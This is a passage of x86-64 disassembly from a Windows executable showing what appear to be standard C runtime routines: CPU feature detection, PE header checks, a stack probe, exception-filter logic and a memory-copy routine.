   14000e59f:	44 89 4a 34          	mov    %r9d,0x34(%rdx)
   14000e5a3:	33 c9                	xor    %ecx,%ecx
   14000e5a5:	c6 42 30 01          	movb   $0x1,0x30(%rdx)
   14000e5a9:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000e5ae:	c7 42 2c 09 00 00 00 	movl   $0x9,0x2c(%rdx)
   14000e5b5:	33 d2                	xor    %edx,%edx
   14000e5b7:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000e5bc:	e8 4b 97 ff ff       	call   0x140007d0c
   14000e5c1:	83 c8 ff             	or     $0xffffffff,%eax
   14000e5c4:	48 83 c4 58          	add    $0x58,%rsp
   14000e5c8:	c3                   	ret
   14000e5c9:	cc                   	int3
   14000e5ca:	cc                   	int3
   14000e5cb:	cc                   	int3
   14000e5cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e5d1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000e5d6:	57                   	push   %rdi
   14000e5d7:	48 83 ec 20          	sub    $0x20,%rsp
   14000e5db:	48 63 f9             	movslq %ecx,%rdi
   14000e5de:	48 8b f2             	mov    %rdx,%rsi
   14000e5e1:	8b cf                	mov    %edi,%ecx
   14000e5e3:	e8 28 ba ff ff       	call   0x14000a010
   14000e5e8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000e5ec:	75 04                	jne    0x14000e5f2
   14000e5ee:	33 db                	xor    %ebx,%ebx
   14000e5f0:	eb 5a                	jmp    0x14000e64c
   14000e5f2:	48 8b 05 77 0b 01 00 	mov    0x10b77(%rip),%rax        # 0x14001f170
   14000e5f9:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000e5fe:	83 ff 01             	cmp    $0x1,%edi
   14000e601:	75 09                	jne    0x14000e60c
   14000e603:	40 84 b8 c8 00 00 00 	test   %dil,0xc8(%rax)
   14000e60a:	75 0d                	jne    0x14000e619
   14000e60c:	3b f9                	cmp    %ecx,%edi
   14000e60e:	75 20                	jne    0x14000e630
   14000e610:	f6 80 80 00 00 00 01 	testb  $0x1,0x80(%rax)
   14000e617:	74 17                	je     0x14000e630
   14000e619:	e8 f2 b9 ff ff       	call   0x14000a010
   14000e61e:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000e623:	48 8b d8             	mov    %rax,%rbx
   14000e626:	e8 e5 b9 ff ff       	call   0x14000a010
   14000e62b:	48 3b c3             	cmp    %rbx,%rax
   14000e62e:	74 be                	je     0x14000e5ee
   14000e630:	8b cf                	mov    %edi,%ecx
   14000e632:	e8 d9 b9 ff ff       	call   0x14000a010
   14000e637:	48 8b c8             	mov    %rax,%rcx
   14000e63a:	ff 15 d8 19 00 00    	call   *0x19d8(%rip)        # 0x140010018
   14000e640:	85 c0                	test   %eax,%eax
   14000e642:	75 aa                	jne    0x14000e5ee
   14000e644:	ff 15 4e 1a 00 00    	call   *0x1a4e(%rip)        # 0x140010098
   14000e64a:	8b d8                	mov    %eax,%ebx
   14000e64c:	8b cf                	mov    %edi,%ecx
   14000e64e:	e8 01 b9 ff ff       	call   0x140009f54
   14000e653:	48 8b d7             	mov    %rdi,%rdx
   14000e656:	4c 8d 05 13 0b 01 00 	lea    0x10b13(%rip),%r8        # 0x14001f170
   14000e65d:	83 e2 3f             	and    $0x3f,%edx
   14000e660:	48 8b cf             	mov    %rdi,%rcx
   14000e663:	48 c1 f9 06          	sar    $0x6,%rcx
   14000e667:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000e66b:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000e66f:	c6 44 d1 38 00       	movb   $0x0,0x38(%rcx,%rdx,8)
   14000e674:	85 db                	test   %ebx,%ebx
   14000e676:	74 0f                	je     0x14000e687
   14000e678:	48 8b d6             	mov    %rsi,%rdx
   14000e67b:	8b cb                	mov    %ebx,%ecx
   14000e67d:	e8 a2 98 ff ff       	call   0x140007f24
   14000e682:	83 c8 ff             	or     $0xffffffff,%eax
   14000e685:	eb 02                	jmp    0x14000e689
   14000e687:	33 c0                	xor    %eax,%eax
   14000e689:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e68e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000e693:	48 83 c4 20          	add    $0x20,%rsp
   14000e697:	5f                   	pop    %rdi
   14000e698:	c3                   	ret
   14000e699:	cc                   	int3
   14000e69a:	cc                   	int3
   14000e69b:	cc                   	int3
   14000e69c:	83 49 18 ff          	orl    $0xffffffff,0x18(%rcx)
   14000e6a0:	33 c0                	xor    %eax,%eax
   14000e6a2:	48 89 01             	mov    %rax,(%rcx)
   14000e6a5:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000e6a9:	89 41 10             	mov    %eax,0x10(%rcx)
   14000e6ac:	48 89 41 1c          	mov    %rax,0x1c(%rcx)
   14000e6b0:	48 89 41 28          	mov    %rax,0x28(%rcx)
   14000e6b4:	87 41 14             	xchg   %eax,0x14(%rcx)
   14000e6b7:	c3                   	ret
   14000e6b8:	cc                   	int3
   14000e6b9:	cc                   	int3
   14000e6ba:	cc                   	int3
   14000e6bb:	cc                   	int3
   14000e6bc:	cc                   	int3
   14000e6bd:	cc                   	int3
   14000e6be:	cc                   	int3
   14000e6bf:	cc                   	int3
   14000e6c0:	40 53                	rex push %rbx
   14000e6c2:	48 83 ec 10          	sub    $0x10,%rsp
   14000e6c6:	33 c9                	xor    %ecx,%ecx
   14000e6c8:	45 33 c0             	xor    %r8d,%r8d
   14000e6cb:	b8 01 00 00 00       	mov    $0x1,%eax
   14000e6d0:	44 89 05 cd 0f 01 00 	mov    %r8d,0x10fcd(%rip)        # 0x14001f6a4
   14000e6d7:	0f a2                	cpuid
   14000e6d9:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e6dd:	81 e1 00 10 00 18    	and    $0x18001000,%ecx
   14000e6e3:	89 04 24             	mov    %eax,(%rsp)
   14000e6e6:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   14000e6ea:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000e6ee:	81 f9 00 10 00 18    	cmp    $0x18001000,%ecx
   14000e6f4:	75 32                	jne    0x14000e728
   14000e6f6:	33 c9                	xor    %ecx,%ecx
   14000e6f8:	0f 01 d0             	xgetbv
   14000e6fb:	48 c1 e2 20          	shl    $0x20,%rdx
   14000e6ff:	48 0b d0             	or     %rax,%rdx
   14000e702:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000e707:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000e70c:	24 06                	and    $0x6,%al
   14000e70e:	3c 06                	cmp    $0x6,%al
   14000e710:	75 0f                	jne    0x14000e721
   14000e712:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000e718:	44 89 05 85 0f 01 00 	mov    %r8d,0x10f85(%rip)        # 0x14001f6a4
   14000e71f:	eb 07                	jmp    0x14000e728
   14000e721:	44 8b 05 7c 0f 01 00 	mov    0x10f7c(%rip),%r8d        # 0x14001f6a4
   14000e728:	33 c0                	xor    %eax,%eax
   14000e72a:	41 f6 c0 01          	test   $0x1,%r8b
   14000e72e:	74 35                	je     0x14000e765
   14000e730:	33 c9                	xor    %ecx,%ecx
   14000e732:	0f a2                	cpuid
   14000e734:	83 f8 07             	cmp    $0x7,%eax
   14000e737:	7c 2a                	jl     0x14000e763
   14000e739:	33 c9                	xor    %ecx,%ecx
   14000e73b:	b8 07 00 00 00       	mov    $0x7,%eax
   14000e740:	0f a2                	cpuid
   14000e742:	33 c0                	xor    %eax,%eax
   14000e744:	f6 c3 20             	test   $0x20,%bl
   14000e747:	74 1c                	je     0x14000e765
   14000e749:	c7 05 51 0f 01 00 03 	movl   $0x3,0x10f51(%rip)        # 0x14001f6a4
   14000e750:	00 00 00 
   14000e753:	c7 05 43 0f 01 00 03 	movl   $0x3,0x10f43(%rip)        # 0x14001f6a0
   14000e75a:	00 00 00 
   14000e75d:	48 83 c4 10          	add    $0x10,%rsp
   14000e761:	5b                   	pop    %rbx
   14000e762:	c3                   	ret
   14000e763:	33 c0                	xor    %eax,%eax
   14000e765:	44 89 05 34 0f 01 00 	mov    %r8d,0x10f34(%rip)        # 0x14001f6a0
   14000e76c:	48 83 c4 10          	add    $0x10,%rsp
   14000e770:	5b                   	pop    %rbx
   14000e771:	c3                   	ret
   14000e772:	cc                   	int3
   14000e773:	cc                   	int3
   14000e774:	cc                   	int3
   14000e775:	cc                   	int3
   14000e776:	cc                   	int3
   14000e777:	cc                   	int3
   14000e778:	cc                   	int3
   14000e779:	cc                   	int3
   14000e77a:	cc                   	int3
   14000e77b:	cc                   	int3
   14000e77c:	cc                   	int3
   14000e77d:	cc                   	int3
   14000e77e:	cc                   	int3
   14000e77f:	cc                   	int3
   14000e780:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000e784:	45 33 c9             	xor    %r9d,%r9d
   14000e787:	4c 03 c1             	add    %rcx,%r8
   14000e78a:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000e78f:	45 0f b7 50 06       	movzwl 0x6(%r8),%r10d
   14000e794:	48 83 c0 18          	add    $0x18,%rax
   14000e798:	49 03 c0             	add    %r8,%rax
   14000e79b:	45 85 d2             	test   %r10d,%r10d
   14000e79e:	74 20                	je     0x14000e7c0
   14000e7a0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   14000e7a4:	49 3b d0             	cmp    %r8,%rdx
   14000e7a7:	72 0b                	jb     0x14000e7b4
   14000e7a9:	8b 48 08             	mov    0x8(%rax),%ecx
   14000e7ac:	41 03 c8             	add    %r8d,%ecx
   14000e7af:	48 3b d1             	cmp    %rcx,%rdx
   14000e7b2:	72 0e                	jb     0x14000e7c2
   14000e7b4:	41 ff c1             	inc    %r9d
   14000e7b7:	48 83 c0 28          	add    $0x28,%rax
   14000e7bb:	45 3b ca             	cmp    %r10d,%r9d
   14000e7be:	72 e0                	jb     0x14000e7a0
   14000e7c0:	33 c0                	xor    %eax,%eax
   14000e7c2:	c3                   	ret
   14000e7c3:	cc                   	int3
   14000e7c4:	cc                   	int3
   14000e7c5:	cc                   	int3
   14000e7c6:	cc                   	int3
   14000e7c7:	cc                   	int3
   14000e7c8:	cc                   	int3
   14000e7c9:	cc                   	int3
   14000e7ca:	cc                   	int3
   14000e7cb:	cc                   	int3
   14000e7cc:	cc                   	int3
   14000e7cd:	cc                   	int3
   14000e7ce:	cc                   	int3
   14000e7cf:	cc                   	int3
   14000e7d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e7d5:	57                   	push   %rdi
   14000e7d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000e7da:	48 8b d9             	mov    %rcx,%rbx
   14000e7dd:	48 8d 3d 1c 18 ff ff 	lea    -0xe7e4(%rip),%rdi        # 0x140000000
   14000e7e4:	48 8b cf             	mov    %rdi,%rcx
   14000e7e7:	e8 34 00 00 00       	call   0x14000e820
   14000e7ec:	85 c0                	test   %eax,%eax
   14000e7ee:	74 1f                	je     0x14000e80f
   14000e7f0:	48 2b df             	sub    %rdi,%rbx
   14000e7f3:	48 8b d3             	mov    %rbx,%rdx
   14000e7f6:	48 8b cf             	mov    %rdi,%rcx
   14000e7f9:	e8 82 ff ff ff       	call   0x14000e780
   14000e7fe:	48 85 c0             	test   %rax,%rax
   14000e801:	74 0c                	je     0x14000e80f
   14000e803:	8b 40 24             	mov    0x24(%rax),%eax
   14000e806:	f7 d0                	not    %eax
   14000e808:	c1 e8 1f             	shr    $0x1f,%eax
   14000e80b:	eb 02                	jmp    0x14000e80f
   14000e80d:	33 c0                	xor    %eax,%eax
   14000e80f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e814:	48 83 c4 20          	add    $0x20,%rsp
   14000e818:	5f                   	pop    %rdi
   14000e819:	c3                   	ret
   14000e81a:	cc                   	int3
   14000e81b:	cc                   	int3
   14000e81c:	cc                   	int3
   14000e81d:	cc                   	int3
   14000e81e:	cc                   	int3
   14000e81f:	cc                   	int3
   14000e820:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000e825:	66 39 01             	cmp    %ax,(%rcx)
   14000e828:	75 1e                	jne    0x14000e848
   14000e82a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000e82e:	48 03 d1             	add    %rcx,%rdx
   14000e831:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000e837:	75 0f                	jne    0x14000e848
   14000e839:	33 c0                	xor    %eax,%eax
   14000e83b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000e840:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000e844:	0f 94 c0             	sete   %al
   14000e847:	c3                   	ret
   14000e848:	33 c0                	xor    %eax,%eax
   14000e84a:	c3                   	ret
   14000e84b:	cc                   	int3
   14000e84c:	40 53                	rex push %rbx
   14000e84e:	48 83 ec 20          	sub    $0x20,%rsp
   14000e852:	48 8d 05 6f 9a 00 00 	lea    0x9a6f(%rip),%rax        # 0x1400182c8
   14000e859:	48 8b d9             	mov    %rcx,%rbx
   14000e85c:	48 89 01             	mov    %rax,(%rcx)
   14000e85f:	f6 c2 01             	test   $0x1,%dl
   14000e862:	74 0a                	je     0x14000e86e
   14000e864:	ba 18 00 00 00       	mov    $0x18,%edx
   14000e869:	e8 0a 00 00 00       	call   0x14000e878
   14000e86e:	48 8b c3             	mov    %rbx,%rax
   14000e871:	48 83 c4 20          	add    $0x20,%rsp
   14000e875:	5b                   	pop    %rbx
   14000e876:	c3                   	ret
   14000e877:	cc                   	int3
   14000e878:	e9 e3 00 00 00       	jmp    0x14000e960
   14000e87d:	cc                   	int3
   14000e87e:	cc                   	int3
   14000e87f:	cc                   	int3
   14000e880:	48 8b c4             	mov    %rsp,%rax
   14000e883:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000e887:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000e88b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e88f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000e893:	41 56                	push   %r14
   14000e895:	48 83 ec 20          	sub    $0x20,%rsp
   14000e899:	49 8b 59 38          	mov    0x38(%r9),%rbx
   14000e89d:	48 8b f2             	mov    %rdx,%rsi
   14000e8a0:	4d 8b f0             	mov    %r8,%r14
   14000e8a3:	48 8b e9             	mov    %rcx,%rbp
   14000e8a6:	49 8b d1             	mov    %r9,%rdx
   14000e8a9:	48 8b ce             	mov    %rsi,%rcx
   14000e8ac:	49 8b f9             	mov    %r9,%rdi
   14000e8af:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   14000e8b3:	e8 e0 47 ff ff       	call   0x140003098
   14000e8b8:	8b 45 04             	mov    0x4(%rbp),%eax
   14000e8bb:	24 66                	and    $0x66,%al
   14000e8bd:	f6 d8                	neg    %al
   14000e8bf:	b8 01 00 00 00       	mov    $0x1,%eax
   14000e8c4:	45 1b c9             	sbb    %r9d,%r9d
   14000e8c7:	41 f7 d9             	neg    %r9d
   14000e8ca:	44 03 c8             	add    %eax,%r9d
   14000e8cd:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   14000e8d1:	74 11                	je     0x14000e8e4
   14000e8d3:	4c 8b cf             	mov    %rdi,%r9
   14000e8d6:	4d 8b c6             	mov    %r14,%r8
   14000e8d9:	48 8b d6             	mov    %rsi,%rdx
   14000e8dc:	48 8b cd             	mov    %rbp,%rcx
   14000e8df:	e8 08 5e ff ff       	call   0x1400046ec
   14000e8e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e8e9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000e8ee:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000e8f3:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000e8f8:	48 83 c4 20          	add    $0x20,%rsp
   14000e8fc:	41 5e                	pop    %r14
   14000e8fe:	c3                   	ret
   14000e8ff:	cc                   	int3
   14000e900:	cc                   	int3
   14000e901:	cc                   	int3
   14000e902:	cc                   	int3
   14000e903:	cc                   	int3
   14000e904:	cc                   	int3
   14000e905:	cc                   	int3
   14000e906:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e90d:	00 00 00 
   14000e910:	48 83 ec 10          	sub    $0x10,%rsp
   14000e914:	4c 89 14 24          	mov    %r10,(%rsp)
   14000e918:	4c 89 5c 24 08       	mov    %r11,0x8(%rsp)
   14000e91d:	4d 33 db             	xor    %r11,%r11
   14000e920:	4c 8d 54 24 18       	lea    0x18(%rsp),%r10
   14000e925:	4c 2b d0             	sub    %rax,%r10
   14000e928:	4d 0f 42 d3          	cmovb  %r11,%r10
   14000e92c:	65 4c 8b 1c 25 10 00 	mov    %gs:0x10,%r11
   14000e933:	00 00 
   14000e935:	4d 3b d3             	cmp    %r11,%r10
   14000e938:	73 16                	jae    0x14000e950
   14000e93a:	66 41 81 e2 00 f0    	and    $0xf000,%r10w
   14000e940:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   14000e947:	41 c6 03 00          	movb   $0x0,(%r11)
   14000e94b:	4d 3b d3             	cmp    %r11,%r10
   14000e94e:	75 f0                	jne    0x14000e940
   14000e950:	4c 8b 14 24          	mov    (%rsp),%r10
   14000e954:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   14000e959:	48 83 c4 10          	add    $0x10,%rsp
   14000e95d:	c3                   	ret
   14000e95e:	cc                   	int3
   14000e95f:	cc                   	int3
   14000e960:	e9 eb 88 ff ff       	jmp    0x140007250
   14000e965:	cc                   	int3
   14000e966:	cc                   	int3
   14000e967:	cc                   	int3
   14000e968:	cc                   	int3
   14000e969:	cc                   	int3
   14000e96a:	cc                   	int3
   14000e96b:	cc                   	int3
   14000e96c:	cc                   	int3
   14000e96d:	cc                   	int3
   14000e96e:	cc                   	int3
   14000e96f:	cc                   	int3
   14000e970:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e975:	57                   	push   %rdi
   14000e976:	48 83 ec 20          	sub    $0x20,%rsp
   14000e97a:	49 8b f8             	mov    %r8,%rdi
   14000e97d:	48 8b d9             	mov    %rcx,%rbx
   14000e980:	e8 bb 51 ff ff       	call   0x140003b40
   14000e985:	f6 43 04 66          	testb  $0x66,0x4(%rbx)
   14000e989:	75 0d                	jne    0x14000e998
   14000e98b:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000e991:	75 05                	jne    0x14000e998
   14000e993:	83 f8 01             	cmp    $0x1,%eax
   14000e996:	74 0b                	je     0x14000e9a3
   14000e998:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e99d:	48 83 c4 20          	add    $0x20,%rsp
   14000e9a1:	5f                   	pop    %rdi
   14000e9a2:	c3                   	ret
   14000e9a3:	e8 34 56 ff ff       	call   0x140003fdc
   14000e9a8:	48 89 58 20          	mov    %rbx,0x20(%rax)
   14000e9ac:	e8 2b 56 ff ff       	call   0x140003fdc
   14000e9b1:	48 89 78 28          	mov    %rdi,0x28(%rax)
   14000e9b5:	e8 76 88 ff ff       	call   0x140007230
   14000e9ba:	cc                   	int3
   14000e9bb:	cc                   	int3
   14000e9bc:	cc                   	int3
   14000e9bd:	cc                   	int3
   14000e9be:	cc                   	int3
   14000e9bf:	cc                   	int3
   14000e9c0:	cc                   	int3
   14000e9c1:	cc                   	int3
   14000e9c2:	cc                   	int3
   14000e9c3:	cc                   	int3
   14000e9c4:	cc                   	int3
   14000e9c5:	cc                   	int3
   14000e9c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e9cd:	00 00 00 
   14000e9d0:	ff e0                	jmp    *%rax
   14000e9d2:	cc                   	int3
   14000e9d3:	cc                   	int3
   14000e9d4:	cc                   	int3
   14000e9d5:	cc                   	int3
   14000e9d6:	cc                   	int3
   14000e9d7:	cc                   	int3
   14000e9d8:	cc                   	int3
   14000e9d9:	cc                   	int3
   14000e9da:	cc                   	int3
   14000e9db:	cc                   	int3
   14000e9dc:	cc                   	int3
   14000e9dd:	cc                   	int3
   14000e9de:	cc                   	int3
   14000e9df:	cc                   	int3
   14000e9e0:	cc                   	int3
   14000e9e1:	cc                   	int3
   14000e9e2:	cc                   	int3
   14000e9e3:	cc                   	int3
   14000e9e4:	cc                   	int3
   14000e9e5:	cc                   	int3
   14000e9e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e9ed:	00 00 00 
   14000e9f0:	ff 25 9a 18 00 00    	jmp    *0x189a(%rip)        # 0x140010290
   14000e9f6:	cc                   	int3
   14000e9f7:	cc                   	int3
   14000e9f8:	cc                   	int3
   14000e9f9:	cc                   	int3
   14000e9fa:	cc                   	int3
   14000e9fb:	cc                   	int3
   14000e9fc:	cc                   	int3
   14000e9fd:	cc                   	int3
   14000e9fe:	cc                   	int3
   14000e9ff:	cc                   	int3
   14000ea00:	cc                   	int3
   14000ea01:	cc                   	int3
   14000ea02:	cc                   	int3
   14000ea03:	cc                   	int3
   14000ea04:	cc                   	int3
   14000ea05:	cc                   	int3
   14000ea06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ea0d:	00 00 00 
   14000ea10:	ff 25 7a 18 00 00    	jmp    *0x187a(%rip)        # 0x140010290
   14000ea16:	cc                   	int3
   14000ea17:	cc                   	int3
   14000ea18:	cc                   	int3
   14000ea19:	cc                   	int3
   14000ea1a:	cc                   	int3
   14000ea1b:	cc                   	int3
   14000ea1c:	cc                   	int3
   14000ea1d:	cc                   	int3
   14000ea1e:	cc                   	int3
   14000ea1f:	cc                   	int3
   14000ea20:	cc                   	int3
   14000ea21:	cc                   	int3
   14000ea22:	cc                   	int3
   14000ea23:	cc                   	int3
   14000ea24:	cc                   	int3
   14000ea25:	cc                   	int3
   14000ea26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ea2d:	00 00 00 
   14000ea30:	cc                   	int3
   14000ea31:	cc                   	int3
   14000ea32:	cc                   	int3
   14000ea33:	cc                   	int3
   14000ea34:	cc                   	int3
   14000ea35:	cc                   	int3
   14000ea36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000ea3d:	00 00 00 
   14000ea40:	57                   	push   %rdi
   14000ea41:	56                   	push   %rsi
   14000ea42:	48 8b f9             	mov    %rcx,%rdi
   14000ea45:	48 8b f2             	mov    %rdx,%rsi
   14000ea48:	49 8b c8             	mov    %r8,%rcx
   14000ea4b:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000ea4d:	5e                   	pop    %rsi
   14000ea4e:	5f                   	pop    %rdi
   14000ea4f:	c3                   	ret
   14000ea50:	48 8b c1             	mov    %rcx,%rax
   14000ea53:	4c 8d 15 a6 15 ff ff 	lea    -0xea5a(%rip),%r10        # 0x140000000
   14000ea5a:	49 83 f8 0f          	cmp    $0xf,%r8
   14000ea5e:	0f 87 0c 01 00 00    	ja     0x14000eb70
   14000ea64:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000ea6b:	00 00 00 00 00 
   14000ea70:	47 8b 8c 82 30 84 01 	mov    0x18430(%r10,%r8,4),%r9d
   14000ea77:	00 
   14000ea78:	4d 03 ca             	add    %r10,%r9
   14000ea7b:	41 ff e1             	jmp    *%r9
   14000ea7e:	c3                   	ret
   14000ea7f:	90                   	nop
   14000ea80:	4c 8b 02             	mov    (%rdx),%r8
   14000ea83:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000ea86:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000ea8b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   14000ea90:	4c 89 00             	mov    %r8,(%rax)
   14000ea93:	89 48 08             	mov    %ecx,0x8(%rax)
   14000ea96:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000ea9b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000ea9f:	c3                   	ret
   14000eaa0:	4c 8b 02             	mov    (%rdx),%r8
   14000eaa3:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000eaa7:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000eaac:	4c 89 00             	mov    %r8,(%rax)
   14000eaaf:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000eab3:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   14000eab7:	c3                   	ret
   14000eab8:	0f b7 0a             	movzwl (%rdx),%ecx
   14000eabb:	66 89 08             	mov    %cx,(%rax)
   14000eabe:	c3                   	ret
   14000eabf:	90                   	nop
   14000eac0:	8b 0a                	mov    (%rdx),%ecx
   14000eac2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000eac7:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000eacc:	89 08                	mov    %ecx,(%rax)
   14000eace:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000ead3:	44 88 48 06          	mov    %r9b,0x6(%rax)
   14000ead7:	c3                   	ret
   14000ead8:	4c 8b 02             	mov    (%rdx),%r8
   14000eadb:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000eade:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000eae3:	4c 89 00             	mov    %r8,(%rax)
   14000eae6:	89 48 08             	mov    %ecx,0x8(%rax)
   14000eae9:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000eaee:	c3                   	ret
   14000eaef:	0f b7 0a             	movzwl (%rdx),%ecx
   14000eaf2:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   14000eaf7:	66 89 08             	mov    %cx,(%rax)
   14000eafa:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000eafe:	c3                   	ret
   14000eaff:	90                   	nop
   14000eb00:	4c 8b 02             	mov    (%rdx),%r8
   14000eb03:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000eb06:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000eb0b:	4c 89 00             	mov    %r8,(%rax)
   14000eb0e:	89 48 08             	mov    %ecx,0x8(%rax)
   14000eb11:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   14000eb15:	c3                   	ret
   14000eb16:	4c 8b 02             	mov    (%rdx),%r8
   14000eb19:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000eb1d:	4c 89 00             	mov    %r8,(%rax)
   14000eb20:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000eb24:	c3                   	ret
   14000eb25:	4c 8b 02             	mov    (%rdx),%r8
   14000eb28:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000eb2c:	4c 89 00             	mov    %r8,(%rax)
   14000eb2f:	88 48 08             	mov    %cl,0x8(%rax)
   14000eb32:	c3                   	ret
   14000eb33:	4c 8b 02             	mov    (%rdx),%r8
   14000eb36:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000eb39:	4c 89 00             	mov    %r8,(%rax)
   14000eb3c:	89 48 08             	mov    %ecx,0x8(%rax)
   14000eb3f:	c3                   	ret
   14000eb40:	8b 0a                	mov    (%rdx),%ecx
   14000eb42:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000eb47:	89 08                	mov    %ecx,(%rax)
   14000eb49:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000eb4e:	c3                   	ret
   14000eb4f:	8b 0a                	mov    (%rdx),%ecx
   14000eb51:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   14000eb56:	89 08                	mov    %ecx,(%rax)
   14000eb58:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000eb5c:	c3                   	ret
   14000eb5d:	48 8b 0a             	mov    (%rdx),%rcx
   14000eb60:	48 89 08             	mov    %rcx,(%rax)
   14000eb63:	c3                   	ret
   14000eb64:	0f b6 0a             	movzbl (%rdx),%ecx
   14000eb67:	88 08                	mov    %cl,(%rax)
   14000eb69:	c3                   	ret
   14000eb6a:	8b 0a                	mov    (%rdx),%ecx
   14000eb6c:	89 08                	mov    %ecx,(%rax)
   14000eb6e:	c3                   	ret
   14000eb6f:	90                   	nop
   14000eb70:	49 83 f8 20          	cmp    $0x20,%r8
   14000eb74:	77 17                	ja     0x14000eb8d
   14000eb76:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000eb7a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   14000eb81:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   14000eb85:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000eb8c:	c3                   	ret
   14000eb8d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   14000eb91:	48 3b ca             	cmp    %rdx,%rcx
   14000eb94:	4c 0f 46 c9          	cmovbe %rcx,%r9
   14000eb98:	49 3b c9             	cmp    %r9,%rcx
   14000eb9b:	0f 82 4f 04 00 00    	jb     0x14000eff0
   14000eba1:	83 3d a8 f4 00 00 03 	cmpl   $0x3,0xf4a8(%rip)        # 0x14001e050
   14000eba8:	0f 82 f2 02 00 00    	jb     0x14000eea0
   14000ebae:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   14000ebb5:	76 26                	jbe    0x14000ebdd
   14000ebb7:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000ebbe:	77 1d                	ja     0x14000ebdd
   14000ebc0:	4c 8d 49 40          	lea    0x40(%rcx),%r9
   14000ebc4:	48 3b ca             	cmp    %rdx,%rcx
